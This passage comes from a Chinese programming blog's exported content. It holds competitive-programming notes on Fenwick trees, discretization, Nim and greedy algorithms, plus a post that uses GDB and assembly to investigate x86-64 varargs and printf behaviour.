class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//NYOJ 123</span></span><br><span class=\"line\"><span class=\"keyword\">int</span> c[<span class=\"number\">1000010</span>],N;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">lowbit</span><span class=\"params\">(<span class=\"keyword\">int</span> x)</span> <span class=\"comment\">//求最低位1的位置所表示的数</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> x&amp;(-x);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">update</span><span class=\"params\">(<span class=\"keyword\">int</span> p,<span class=\"keyword\">int</span> q)</span><span class=\"comment\">//常规数组中的a[p]更新，在树状数组中需要这样更新</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">while</span>(p&lt;=N)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        c[p]+=q;</span><br><span class=\"line\">        p+=lowbit(p);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">S</span><span class=\"params\">(<span class=\"keyword\">int</span> x)</span>  <span class=\"comment\">//S(i)表示的是的前i个数的和</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> sum=<span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(x&gt;<span class=\"number\">0</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        sum+=c[x];</span><br><span class=\"line\">        <span class=\"built_in\">cout</span>&lt;&lt;<span class=\"string\">\"sum: \"</span>&lt;&lt;sum&lt;&lt;<span class=\"string\">\" \"</span>;</span><br><span class=\"line\">        x-=lowbit(x);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">cout</span>&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> sum;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> T;</span><br><span class=\"line\">    <span class=\"keyword\">char</span> s[<span class=\"number\">10</span>];</span><br><span class=\"line\">    <span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d%d\"</span>,&amp;T,&amp;N);</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(T--)&#123;</span><br><span class=\"line\">        <span class=\"built_in\">scanf</span>(<span class=\"string\">\"%s\"</span>,s);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(s[<span class=\"number\">0</span>]==<span class=\"string\">'A'</span>)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">int</span> l,r,num;</span><br><span class=\"line\">            <span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d%d%d\"</span>,&amp;l,&amp;r,&amp;num);</span><br><span class=\"line\">            update(l,num);</span><br><span class=\"line\">            update(r+<span class=\"number\">1</span>,-num);</span><br><span class=\"line\">          <span class=\"comment\">//每个士兵 i 的军功都是前 i 个元素的和，所以，[l, m]区间每个人加 num 的军功只需要给</span></span><br><span class=\"line\">          <span class=\"comment\">//l 位置加上num，这样，[l, N]区间的每个人都加上了 num ，但是，我们只要[l, m]，所以要</span></span><br><span class=\"line\">          <span class=\"comment\">//给 m+1 位置减去num,</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">int</span> x;</span><br><span class=\"line\">            <span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>,&amp;x);</span><br><span class=\"line\">            <span class=\"built_in\">printf</span>(<span class=\"string\">\"%d\\n\"</span>,S(x));</span><br><span class=\"line\">            <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;i&lt;=x;i++) &#123;</span><br><span class=\"line\">                <span class=\"built_in\">cout</span>&lt;&lt;c[i]&lt;&lt;<span class=\"string\">\" \"</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"built_in\">cout</span>&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">            <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;i&lt;=x;i++) &#123;</span><br><span class=\"line\">                <span class=\"built_in\">cout</span>&lt;&lt;S(i)&lt;&lt;<span class=\"string\">\" \"</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"built_in\">cout</span>&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h3 id=\"离散化\"><a href=\"#离散化\" class=\"headerlink\" title=\"离散化\"></a>离散化</h3><ul>\n<li><p><a href=\"https://vijos.org/p/1056\" target=\"_blank\" rel=\"noopener\">图形面积</a>，<a href=\"http://www.cnblogs.com/forgot93/archive/2014/07/02/3819956.html\" target=\"_blank\" rel=\"noopener\">解答</a></p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;iostream&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;algorithm&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;cstdio&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;math.h&gt;</span></span></span><br><span class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</span><br><span class=\"line\"><span class=\"keyword\">double</span> x[<span class=\"number\">201</span>],y[<span class=\"number\">201</span>],s[<span class=\"number\">101</span>][<span class=\"number\">4</span>];</span><br><span class=\"line\"><span class=\"keyword\">int</span> xy[<span class=\"number\">201</span>][<span class=\"number\">201</span>];</span><br><span class=\"line\"><span class=\"keyword\">int</span> n,cas=<span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"keyword\">double</span> sum;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> i,j,k;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(<span class=\"built_in\">cin</span>&gt;&gt;n)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(n==<span class=\"number\">0</span>)   <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        cas++;</span><br><span class=\"line\">        k=<span class=\"number\">0</span>;</span><br><span class=\"line\">        sum=<span class=\"number\">0.0</span>;</span><br><span class=\"line\">        <span class=\"built_in\">memset</span>(xy,<span class=\"number\">0</span>,<span class=\"keyword\">sizeof</span>(xy));</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">for</span>(i=<span class=\"number\">1</span>;i&lt;=n;i++)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"built_in\">cin</span>&gt;&gt;s[i][<span class=\"number\">0</span>]&gt;&gt;s[i][<span class=\"number\">1</span>]&gt;&gt;s[i][<span class=\"number\">2</span>]&gt;&gt;s[i][<span class=\"number\">3</span>];</span><br><span class=\"line\">            x[k]=s[i][<span class=\"number\">0</span>];</span><br><span class=\"line\">            y[k]=s[i][<span class=\"number\">1</span>];</span><br><span class=\"line\">            k++;</span><br><span class=\"line\">            x[k]=s[i][<span class=\"number\">2</span>];</span><br><span class=\"line\">            y[k]=s[i][<span class=\"number\">3</span>];</span><br><span class=\"line\">            k++;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        sort(x,x+<span class=\"number\">2</span>*n);</span><br><span class=\"line\">        sort(y,y+<span class=\"number\">2</span>*n);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i=<span class=\"number\">1</span>;i&lt;=n;i++)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">         <span class=\"keyword\">int</span>  i1=lower_bound(x,x+<span class=\"number\">2</span>*n,s[i][<span class=\"number\">0</span>])-x;<span class=\"comment\">//二分查找，跟普通的FOR语句一样</span></span><br><span class=\"line\">         <span class=\"keyword\">int</span>  j1=lower_bound(y,y+<span class=\"number\">2</span>*n,s[i][<span class=\"number\">1</span>])-y;</span><br><span class=\"line\">         <span class=\"keyword\">int</span>  i2=lower_bound(x,x+<span class=\"number\">2</span>*n,s[i][<span class=\"number\">2</span>])-x;</span><br><span class=\"line\">         <span class=\"keyword\">int</span>  j2=lower_bound(y,y+<span class=\"number\">2</span>*n,s[i][<span class=\"number\">3</span>])-y;</span><br><span class=\"line\">         <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> p1=i1;p1&lt;i2;p1++)</span><br><span class=\"line\">           <span class=\"comment\">//标记状态，记住我们是以一个方块的角标记状态所以p1&lt;i2，不是&lt;=</span></span><br><span class=\"line\">         <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> p=j1;p&lt;j2;p++)</span><br><span class=\"line\">         xy[p1][p]=<span class=\"number\">1</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;i&lt;<span class=\"number\">2</span>*n;i++)<span class=\"comment\">//统计</span></span><br><span class=\"line\">            <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> j=<span class=\"number\">0</span>;j&lt;<span class=\"number\">2</span>*n;j++)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (xy[i][j]) &#123;</span><br><span class=\"line\">            sum+=(x[i+<span class=\"number\">1</span>]-x[i])*(y[j+<span class=\"number\">1</span>]-y[j]);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">         <span class=\"built_in\">printf</span>(<span class=\"string\">\"Test case #%d\\n\"</span>,cas);</span><br><span class=\"line\">         <span class=\"built_in\">printf</span>(<span class=\"string\">\"Total explored area: %.2f\\n\"</span>,sum);</span><br><span class=\"line\">         <span class=\"built_in\">printf</span>(<span class=\"string\">\"\\n\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>其实就是，把坐标间的距离都忽略掉，把坐标的集中在一起，一个挨着一个，然后遍历整个标记区域，某个单元格有标记说明该位置两边都对应地存在两个坐标（原始数据中的），则只需要知道这两个原始数据中的坐标相差多远，就可以知道这个标记代表着多大的面积。</p>\n</li>\n</ul>\n<h3 id=\"POJ3278\"><a href=\"#POJ3278\" class=\"headerlink\" title=\"POJ3278\"></a>POJ3278</h3><ul>\n<li>N是人的位置，K是牛的位置</li>\n<li>一种lgN的做法<ul>\n<li>如果N的二进制大于等于K的二进制，则直接走x-1法</li>\n<li>否则，想办法修改N的二进制使得其与K的二进制的最高几位重合，然后接下来的二进制就直接用x2和+1来实现（二进制位为0则x2，为1则+1）</li>\n<li>假设K与N重合的二进制部分为W<ul>\n<li>如果W&lt;N，可以消减N使得N==W，也可以N乘以多次2然后减去一些1使得N与新的W相同（因为随着N×2，其与K重合的最高二进制位变多，所以说是新的W）</li>\n<li>如果W&gt;N，可以先进行多次加一使得重合，或者是多次×2后多次-1使得重合</li>\n<li>即使W小于N，也有可能先乘以几次2后在进行几次-1比较高效（因为可能后面很多个1，导致如果直接消减W）</li>\n</ul>\n</li>\n<li>总结起来就是，构造W与N相同的过程中，可以对N乘以一次2、两次2…P次2，对于每种乘2，减去或加上一些1使得重合，然后再计算在此基础上需要的时间</li>\n<li>也就是不断试错的过程</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"子集和问题的动态规划解法\"><a href=\"#子集和问题的动态规划解法\" class=\"headerlink\" title=\"子集和问题的动态规划解法\"></a>子集和问题的动态规划解法</h3><ul>\n<li>如果只是要求出是否有一个解法，或者是要求出有多少个解法，那么动态规划可行</li>\n</ul>\n<h3 id=\"子集和问题变形\"><a href=\"#子集和问题变形\" class=\"headerlink\" title=\"子集和问题变形\"></a>子集和问题变形</h3><ul>\n<li>问题：给定一个正整数M和另一个K，要求求出M切分成K份，每份都是正整数的解法有多少。同样可以动态规划</li>\n</ul>\n<h3 id=\"floyd求最小环\"><a href=\"#floyd求最小环\" class=\"headerlink\" title=\"floyd求最小环\"></a>floyd求最小环</h3><ul>\n<li>最小环的定义：在有向或是无向的简单图中在找到一条路径，其从点x到点x，总的权重最小。（不可以直接x到x，在无向图中也不可以利用x到y，y到x，因为如果可以这样，意味着多重边或是使用同一条边）</li>\n<li>如果可以确定w[x][x] = INF，那么floyd然后找到最小的w[x][x]既可。</li>\n<li>否则，不可以通过使得所有的w[x][x]变为INF来实现，因为floyd过程中，会使用到</li>\n</ul>\n<h3 id=\"查询第K大\"><a href=\"#查询第K大\" class=\"headerlink\" title=\"查询第K大\"></a>查询第K大</h3><ul>\n<li>如果是静态数组，多次查询，直接一个sort</li>\n<li>如果是静态数组，一次查询，算导中那个快排变体，$O(N)$</li>\n<li>如果是动态数组，字典树——每个数以二进制表示，构造字典树，字典树的node需要维护当前node为root的子树的叶子数目，从而在任意一个非叶子节点，可以选择要走那条路下去——可以算出，二进制比x进制更快</li>\n</ul>\n<h3 id=\"Nim游戏（博弈论）\"><a href=\"#Nim游戏（博弈论）\" class=\"headerlink\" title=\"Nim游戏（博弈论）\"></a>Nim游戏（博弈论）</h3><ul>\n<li><blockquote>\n<p>定义P-position和N-position，其中P代表Previous，N代表Next。直观的说，上一次move的人有必胜策略的局面是P-position，也就是“后手可保证必胜”或者“先手必败”，现在轮到move的人有必胜策略的局面是N-position，也就是“先手可保证必胜”。更严谨的定义是：1.无法进行任何移动的局面（也就是terminal position）是P-position；2.可以移动到P-position的局面是N-position；3.所有移动都导致N-position的局面是P-position。</p>\n</blockquote>\n</li>\n<li>P-position需要保证所有子格局都是N-position，N-position只要找到第一个子格局是P-position即可。</li>\n<li>通过数学归纳法，两堆石子的情况下，两堆相等是P-position</li>\n<li><blockquote>\n<p>如果局面不可能重现，或者说positions的集合可以进行拓扑排序，那么每个position或者是P-position或者是N-position，而且可以通过定义计算出来。</p>\n</blockquote>\n</li>\n<li></li>\n</ul>\n<h3 id=\"HDU3483\"><a href=\"#HDU3483\" class=\"headerlink\" title=\"HDU3483\"></a>HDU3483</h3><h5 id=\"题意\"><a href=\"#题意\" class=\"headerlink\" title=\"[题意]\"></a>[题意]</h5><p>输入n, x, m ，求$(1^x)<em>(x^1)+(2^x)</em>(x^2)+(3^x)<em>(x^3)+…+(n^x)</em>(x^n)$ </p>\n<h5 id=\"解题方法\"><a href=\"#解题方法\" class=\"headerlink\" title=\"[解题方法]\"></a>[解题方法]</h5><p>设$f[n] = [x^n, n<em>(x^n), (n^2)</em>(x^n),…, (n^x)<em>(x^n)]$，则$f[n][k] = (n^k)</em>(x^n)$，问题转化为求：$(g[n] = f[1][x]+f[2][x]+…+f[n][x])$，设C(i,j)为组合数，即i种元素取j种的方法数，所以有：$$f[n+1][k] = ((n+1)^k)<em>(x^(n+1)) \\text{（二次多项式展开）}\\ = x</em>( C(k,0)<em>(x^n)+C(k,1)</em>n<em>(x^n)+…+C(k,k)</em>(n^k)<em>(x^n))\\= x</em>(C(k,0)<em>f[n][0]+C(k,1)</em>f[n][1]+…+C(k,k)*f[n][k])​$$<br>所以得： </p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">|x*1 0................................0|        |f[n][0]|       |f[n+1][0]| </span><br><span class=\"line\">|x*1 x*1 0............................0|        |f[n][1]|       |f[n+1][1]| </span><br><span class=\"line\">|x*1 x*2 x*1 0........................0|    *   |f[n][2]|   =   |f[n+1][2]| </span><br><span class=\"line\">|......................................|        |.......|       |.........| </span><br><span class=\"line\">|x*1 x*C(k,1) x*C(k,2)...x*C(k,x) 0...0|        |f[n][k]|       |f[n+1][k]| </span><br><span class=\"line\">|......................................|        |.......|       |.........| </span><br><span class=\"line\">|x*1 x*C(x,1) x*C(x,2).......x*C(x,x) 0|        |f[n][x]|       |f[n+1][x]| </span><br><span class=\"line\">|0................................0 1 1|        |g[n-1] |       | g[ n ]  |</span><br></pre></td></tr></table></figure>\n<h3 id=\"KMP算法理解\"><a href=\"#KMP算法理解\" class=\"headerlink\" title=\"KMP算法理解\"></a>KMP算法理解</h3><h4 id=\"预处理算法\"><a href=\"#预处理算法\" class=\"headerlink\" title=\"预处理算法\"></a>预处理算法</h4><ul>\n<li>预处理出来的第 $i$ 位结果 $p[i]$ 是原字符串截止到第 $i$ 那个字符的最小周期，也就是只需要移动最少量的字符 $p[i]$ 既可以使得原先匹配部分再次匹配起来。</li>\n</ul>\n<h3 id=\"为什么偶数长度的回文数字串不是primer\"><a href=\"#为什么偶数长度的回文数字串不是primer\" class=\"headerlink\" title=\"为什么偶数长度的回文数字串不是primer\"></a>为什么偶数长度的回文数字串不是primer</h3><ul>\n<li><a href=\"https://leetcode.com/problems/prime-palindrome/discuss/212297/Why-even-prime-palindromes-are-not-possible\" target=\"_blank\" rel=\"noopener\">ref</a></li>\n<li><blockquote>\n<p>Because even length prime digit numbers are divisible by 11 therefore are not prime.<br>It’s a trick that has to do powers of 10 and mod 11.<br>Ex: 10 = 10^1 mod 11 = -1 mod 11<br>​      $100 = 10^2 = 1 \\mod 11$<br>​      $1000 = 10^3 = -1 \\mod 11$<br>​      $10000 = 10^4 = 1 \\mod 11$<br>See the pattern?<br>Even exponent powers of 10 are 1 mod 11<br>Odd exponent powers of 10 are -1 mod 11.</p>\n<p>We also know decimal numbers are just base 10 expansion of the digits.</p>\n<p>So   $1225 = (10^3<em>)1 + 2</em>(10^2) + 2<em>(10^1) + 5</em>(10^0).$<br>​        using modular arithmetic we can say,</p>\n<pre><code>1225 MOD 11 = (-1)*1 + 2*(1) + 2*(-1) + 5*(1) = -1 + 2 + 2 + 5 = 8.\n\nIn other words, in MOD 11 we calculate what a decimal number is by just alternating the addition and subtraction across the digits.\n</code></pre><p>Another example.</p>\n<p>$1323412 \\mod 11 =   1 -3  +2 -3 +4 -1 +2\\mod 11 = 0.$</p>\n<p>Then it becomes why it is quite obvious why the above logic works for even palindromes.</p>\n<p>Example: </p>\n<p>$321123 =      -3 + 2 - 1 + 1 -2 + 3 = 0$. All the numbers cancel out with each other.</p>\n</blockquote>\n</li>\n</ul>\n<h3 id=\"贪心算法总结\"><a href=\"#贪心算法总结\" class=\"headerlink\" title=\"贪心算法总结\"></a>贪心算法总结</h3><ul>\n<li>在每个贪心算法后面几乎总有一个DP解法</li>\n<li>如何<strong>证明</strong>是否可以用贪心算法求解一个问题？并没有通用方法，但是贪心选择性质和最优子结构是两个关键要素</li>\n<li>如果贪心选择时需要考虑众多选择，通常意味着可以改进贪心选择来获得更高效的解法</li>\n</ul>\n<h5 id=\"贪心选择性质\"><a href=\"#贪心选择性质\" class=\"headerlink\" title=\"贪心选择性质\"></a>贪心选择性质</h5><ul>\n<li>可以通过做出局部最优的选择来构造全局最优</li>\n<li>证明方法：首先考察某个子问题的最优解，然后用贪心选择替换某个其他选择来修改此解，从而得到一个相似但是更小的子问题</li>\n</ul>\n<h5 id=\"一组有效的步骤\"><a href=\"#一组有效的步骤\" class=\"headerlink\" title=\"一组有效的步骤\"></a>一组有效的步骤</h5><ul>\n<li>确定问题的最优子结构（如果一个问题的最优解包含其子问题的最优解，则称此问题具有最优子结构性质）</li>\n<li>设计一个递归解法（该递归解法加上记忆就可以变成自顶向下的DP）</li>\n<li>证明如果做出一个贪心选择，就只剩下一个子问题（或许可能是几个子问题？不过子问题的数量确实要比自顶向下的DP解法少）</li>\n<li>证明贪心选择总是安全的<ul>\n<li>什么是安全的？</li>\n<li>做出贪心选择后，原问题总存在最优解，即贪心选择总是安全的</li>\n<li>做出贪心选择后，剩余的子问题满足性质：其最优解与贪心选择组合即可得到原问题的最优解，这样就得到了最优子结构</li>\n</ul>\n</li>\n<li>设计一个递归算法实现贪心策略</li>\n<li>把递归算法转为迭代算法</li>\n</ul>\n<h5 id=\"一组简化的步骤\"><a href=\"#一组简化的步骤\" class=\"headerlink\" title=\"一组简化的步骤\"></a>一组简化的步骤</h5><ul>\n<li>将最优化问题转为这样的形式：做出一次选择后，只剩下一个子问题需要求解</li>\n<li>证明做出贪心选择后，原问题总存在最优解，即贪心选择总是安全的</li>\n<li>证明做出贪心选择后，剩余的子问题满足性质：其最优解与贪心选择组合即可得到原问题的最优解，这样就得到了最优子结构</li>\n</ul>\n","slug":"My-ACM-Note","categories":[{"name":"算法","slug":"算法","permalink":"https://h-zex.github.io/categories/算法/"}],"tags":[{"name":"ACM","slug":"ACM","permalink":"https://h-zex.github.io/tags/ACM/"},{"name":"note","slug":"note","permalink":"https://h-zex.github.io/tags/note/"}]},{"title":"printf的一个异常现象引发的对x86-64体系下可变参数传参的探究","date":"2018-01-19T03:31:36.000Z","path":"2018/01/19/printf的一个异常现象引发的对x86-64体系下可变参数传参的探究/","text":"测试环境 12345clang version 3.8.1-24 (tags/RELEASE_381/final)Target: x86_64-pc-linux-gnuThread model: posixLinux version 4.9.0-deepin13-amd64 (yangbo@deepin.com) (gcc version 6.3.0 20170321 (Debian 6.3.0-11) ) #1 SMP PREEMPT Deepin 4.9.57-1 (2017-10-19) 奇异现象复现 代码 1234567#include &lt;stdio.h&gt;int main()&#123; double a = 6.0; printf(\"%lx\\n\" , a);&#125; 执行结果 这段代码用的运行结果是随机的，无规律的，这是非常奇怪的 先说原因 printf因为使用的格式化字符串是”%lx”所以从通用目的寄存器读取可变参数，但是 a 因为是double类型，所以放在xmm0寄存器。 分析 先看glibc-2.26中stdio-common/printf.c的源码 123456789101112int__printf (const char *format, ...)&#123; va_list arg; int done; va_start (arg, format); done = vfprintf (stdout, format, arg); va_end (arg); return done;&#125; 可以看到，使用的是stdarg的机制实现可变参数传参。 如果可变参数完全使用栈帧传递，那么结果不可能是随机的。那么只可能是使用寄存器传参 复习一下CSAPP第三章 可以看到，浮点参数的传参使用的是SIMD寄存器，而整形使用的是通用目的寄存器 那么猜测，这应该是问题所在。printf因为使用的格式化字符串是”%lx”所以从通用目的寄存器读取可变参数，但是 a 因为是double类型，所以放在xmm0寄存器。 GDB调试 使用 clang -S d.c &amp;&amp; clang d.s -g命令编译上面那段问题代码。这样我们就可以在gdb里针对汇编指令设置断点 main函数部分汇编代码 12345678subq $16, %rspmovabsq $.L.str, %rdi # .L.str就是&quot;%lx\\n&quot;movsd .LCPI0_0, %xmm0 # 字面量的浮点放在内存，.LCPI0_0引用的就是 double 类型的 6.0movsd %xmm0, -8(%rbp)movsd -8(%rbp), %xmm0 movb $1, %alcallq printf 可以看到，double a 确实放在了xmm0, 用GDB在 callq printf 处设置断点(注意，运行到断点处，callq printf指令还没有执行)，检查用于传参的前四个通用目的寄存器 （红框内是前四个传参的通用目的寄存器） 执行gdb 的next指令 ，运行callq printf这条指令，检查输出 可以看到，与rsi寄存器的内容一样。可以初步确认，因为格式字符串是”%lx”，所以printf在通用目的寄存器读取可变参数 手动修改汇编代码，在callq printf之前加上一条movq $16, %rsi（注意，此处是十进制，而printf使用的格式字符串是”%lx”，所以程序输出的是十六进制） 1234567movabsq $.L.str, %rdimovsd .LCPI0_0, %xmm0 # xmm0 = mem[0],zeromovsd %xmm0, -8(%rbp)movsd -8(%rbp), %xmm0 # xmm0 = mem[0],zeromovb $1, %almovq $16, %rsi # 这一条就是加上去的callq printf 运行，结果是 符合预期，与rsi寄存器的东西一样 分析结果得到证实 探究过程出现的一些问题 在不合时宜的时刻检查寄存器的值 执行完callq printf后才检查xmm0、xmm1的内容，企图找到double a 执行完callq printf后才检查rdi、rsi的值。 因为printf函数会使用这些寄存器，所以这样检查必然是不行的 关于vc++的一些补充 Visual Studio 2015的参数传递文档 ​ 注意：这里的b不是在xmm0，而是在xmm1，d也是如此 Visual Studio 2015 的 Varargs文档 如果参数是通过 vararg（例如省略号参数）传递的，则基本上会应用正常的参数传递过程，包括溢出第五个及后续参数。 此外，被调用方的责任是转储采用其地址的参数。仅处理浮点值时，如果被调用方要使用整数寄存器中的值，整数寄存器和浮点寄存器才会同时包含浮点值 if parameters are passed via varargs (for example, ellipsis arguments), then essentially the normal parameter passing applies including spilling the fifth and subsequent arguments. It is again the callee’s responsibility to dump arguments that have their address taken. For floating-point values only, both the integer and the floating-point register will contain the float value in case the callee expects the value in the integer registers. 按照我的理解，加粗部分应该是说，如果实参里有integer也有float-point，那么我们在整形寄存器也可以读取到对应序号的浮点寄存器的值，比如test(3, 2.0, 1)，那么2.0既存在于RDX，也存在于XMM1， 1既存在于R8，也存在于xmm2。这样，我们使用stdarg的va_arg(ap, long long)读取第二个参数2.0时，就不会出错。如果是gcc，就会出错，因为gcc并不会把浮点放在整形寄存器。 这应该是微软为了兼容以前的老代码，以前可变参都是放在栈上，所以改变va_arg的第二个实参type也不会读错，只会形成强制类型转换。（由于手头没有vc++的编译器，只能借助跟师兄的远程合作来探究，所以这里只有部分猜测被证实，读者可以自己测试一下是否在对应序号的整形寄存器和浮点寄存器存在相同的内容）","raw":"---\ntitle: printf的一个异常现象引发的对x86-64体系下可变参数传参的探究\ntoc: false\ncomments: true\nmathjax: true\ndate: 2018-01-19 11:31:36\ntags:\n- printf\n- 操作系统\n- 底层\n- CSAPP\ndescription: x86-64体系下的传参方式使得可变参数的传递出现了一些特别的情况\ncategories:\n- CSAPP\n---\n\n### 测试环境\n\n   ```\nclang version 3.8.1-24 (tags/RELEASE_381/final)\nTarget: x86_64-pc-linux-gnu\nThread model: posix\n\nLinux version 4.9.0-deepin13-amd64 (yangbo@deepin.com) (gcc version 6.3.0 20170321 (Debian 6.3.0-11) ) #1 SMP PREEMPT Deepin 4.9.57-1 (2017-10-19)\n   ```\n\n### 奇异现象复现\n\n- 代码\n\n   ```c\n\n    #include <stdio.h>\n    int main()\n    {\n        double a = 6.0;\n        printf(\"%lx\\n\"\t, a);\n    }\n   ```\n\n- 执行结果\n\n  {% asset_img p6.png %}\n\n- 这段代码用的运行结果是随机的，无规律的，这是非常奇怪的\n\n### 先说原因\n\n- printf因为使用的格式化字符串是\"%lx\"所以从通用目的寄存器读取可变参数，但是 